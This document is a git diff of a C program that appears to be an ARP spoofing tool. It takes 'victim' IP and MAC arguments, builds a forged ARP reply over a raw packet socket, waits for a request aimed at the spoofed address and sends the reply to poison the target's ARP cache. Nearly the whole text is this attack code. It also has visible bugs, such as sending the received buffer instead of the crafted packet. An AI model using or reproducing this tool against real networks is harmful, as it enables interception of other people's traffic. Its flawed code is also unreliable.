@@ -68,7 +68,7 @@ void error_printer(int check)
 {
     if(check == 1)
         fprintf(stderr, "IP address not valid\n");
-    if(check == 3)
+    else if(check == 3)
         fprintf(stderr, "MAC address not valid\n");
     else
         fprintf(stderr, "reply malloc failed");
@@ -79,9 +79,83 @@ void error_printer(int check)
     av[3] = victim IP
     av[4] = victim MAC  
 */
+
+
+int	ft_memcmp(const void *s1, const void *s2, size_t n)
+{
+	unsigned char		*c1;
+	unsigned char		*c2;
+	size_t				cur;
+
+	if (n <= 0)
+		return (0);
+	cur = 0;
+	c1 = (unsigned char *) s1;
+	c2 = (unsigned char *) s2;
+	while (cur < n)
+	{
+		if (c1[cur] != c2[cur])
+			return (c1[cur] - c2[cur]);
+		cur++;
+	}
+	return (0);
+}
+
+void	*ft_memcpy(void *dest, const void *src, size_t n)
+{
+	const unsigned char		*temp_src;
+	unsigned char			*temp_dest;
+
+	if (!dest && !src)
+		return (NULL);
+	temp_dest = (unsigned char *) dest;
+	temp_src = (const unsigned char *) src;
+	while (n > 0)
+	{
+		*(temp_dest++) = *(temp_src++);
+		n--;
+	}
+	return (dest);
+}
+
+void	*ft_memset(void *s, int c, size_t n)
+{
+	size_t			cur;
+	unsigned char	*temp;
+
+	temp = (unsigned char *) s;
+	cur = 0;
+	while (cur < n)
+	{
+		*(temp++) = (unsigned char)c;
+		cur++;
+	}
+	return (s);
+}
+
+void building_in_addr(struct sockaddr_ll *addr)
+{
+    ft_memset(addr, 0, sizeof(*addr));
+    addr->sll_family = AF_PACKET;
+    addr->sll_protocol = htons(ETH_P_ARP);
+    addr->sll_ifindex = if_nametoindex("enp0s3");
+    addr->sll_halen = ETH_ALEN;
+}
+
+void building_package(arp_ether_ipv4 **arp, ether_hdr *fake_header)
+{
+    (*arp)->htype = htons(1);
+    (*arp)->ptype = htons(ETH_P_IP);
+    (*arp)->hlen = ETH_ALEN;
+    (*arp)->plen = 4;
+    (*arp)->op = htons(2);
+    ft_memcpy(&(*arp)->sha, &fake_header->src_addr, ETH_ALEN);
+    ft_memcpy(&(*arp)->tha, &fake_header->dest_addr, ETH_ALEN);
+}
+
 int main(int ac, char **av) 
 {
-    if(ac == 1)
+    if(ac != 5)
     {
         fprintf(stderr, "Args needed\n");
         return 1;
@@ -91,67 +165,54 @@ int main(int ac, char **av)
         printf("Root privilage needed\n");
         return(1);
     }
-    // reply_info *reply = NULL;
-    ether_hdr *fake_header;
+    ether_hdr *fake_header = NULL;
     int check = reply_prep(&fake_header, av); 
     if(check)
     {
         error_printer(check);
         return 1;
     }
+    arp_ether_ipv4 *arp = malloc(sizeof(*arp));
+    ft_memset(arp, 0, sizeof(arp_ether_ipv4));
+    if(inet_pton(AF_INET, av[1], &arp->spa) != 1 || inet_pton(AF_INET, av[3], &arp->tpa) != 1)
+    {
+        error_printer(1);
+        free(fake_header);
+        free(arp);
+        return 1;
+    }
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) 
     {
         fprintf(stderr, "socket");
+        free(fake_header);
+        free(arp);
         return 1;
     }
     uint8_t buf1[2048];
-    // Add signal handler to close and exit on Ctrl+C
-    // while(1)
-    // {
-    recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
-    printf("Packet received, size %zd\n", sizeof(buf1));
-    size_t i = 14;
-    arp_ether_ipv4 *arp = (arp_ether_ipv4 *)(buf1 + i);
-    printf("OP: %hu\n\n", ntohs(arp->op));
-    if (ntohs(arp->op) == 1) // ARP request
+    ft_memset(buf1, 0, sizeof(buf1));
+    // Setup for sendto
+    struct sockaddr_ll addr;
+    building_in_addr(&addr);
+    building_package(&arp, fake_header);
+    ft_memcpy(addr.sll_addr, fake_header->dest_addr, ETH_ALEN);
+
+    arp_ether_ipv4 *recv_arp = (arp_ether_ipv4 *)(buf1 + sizeof(ether_hdr));
+    while(1)
     {
-        // printf("arp->op before :%hu" ,ntohs(arp->op));
-        // arp->op = htons(2);
-        // printf("arp->op after : %hu", ntohs(arp->op));
-        printf("ARP Request:\n");
-        printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->sha[0], arp->sha[1], arp->sha[2], arp->sha[3], arp->sha[4], arp->sha[5]);
-        char ip_buf[INET_ADDRSTRLEN];
-        inet_ntop(AF_INET, &arp->spa, ip_buf, sizeof(ip_buf));
-        printf("Sender IP: %s\n", ip_buf);
-        // printf("Sender IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->spa));
-        printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->tha[0], arp->tha[1], arp->tha[2], arp->tha[3], arp->tha[4], arp->tha[5]);
-        inet_ntop(AF_INET, &arp->tpa, ip_buf, sizeof(ip_buf));
-        printf("Target IP: %s\n", ip_buf);
-    };
-    // printf("Preparing to send ARP reply...\n");
-    arp->op = htons(2);
-    arp->tha[0] = reply->victim_MAC[0];
-    arp->tha[1] = reply->victim_MAC[1];
-    arp->tha[2] = reply->victim_MAC[2];
-    arp->tha[3] = reply->victim_MAC[3];
-    arp->tha[4] = reply->victim_MAC[4];
-    arp->tha[5] = reply->victim_MAC[5];
-    sendto(sock, arp, sizeof(arp_ether_ipv4) + sizeof(ether_hdr), 0, arp->tha[ETH_ALEN], sizeof(arp->tha[ETH_ALEN]));
-    // if (ntohs(arp->op) == 2) // ARP request
-    // {
-    //     // printf("arp->op before :%hu" ,ntohs(arp->op));
-    //     // arp->op = htons(2);
-    //     // printf("arp->op after : %hu", ntohs(arp->op));
-    //     printf("ARP modified Request:\n");
-    //     printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->sha[0], arp->sha[1], arp->sha[2], arp->sha[3], arp->sha[4], arp->sha[5]);
-    //     printf("Sender IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->spa));
-    //     printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arp->tha[0], arp->tha[1], arp->tha[2], arp->tha[3], arp->tha[4], arp->tha[5]);
-    //     printf("Target IP: %s\n", inet_ntoa(*(struct in_addr *)&arp->tpa));
-    // };
-    //
+        recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
+        if(ft_memcmp(&recv_arp->tpa, &arp->spa, sizeof(struct in_addr)) == 0)
+            break;
+        else
+            printf("Jai recu un truc\n");
+    }
+    if(sendto(sock, buf1, sizeof(arp_ether_ipv4) + sizeof(ether_hdr), 0, (struct sockaddr*)&addr,\
+            (socklen_t)sizeof(addr)) < 0)
+        fprintf(stderr, "No send\n");
+    free(fake_header);
+    free(arp);
     close(sock);
-    // exit(0);
-    // }
+
+    
     return 0;
 }
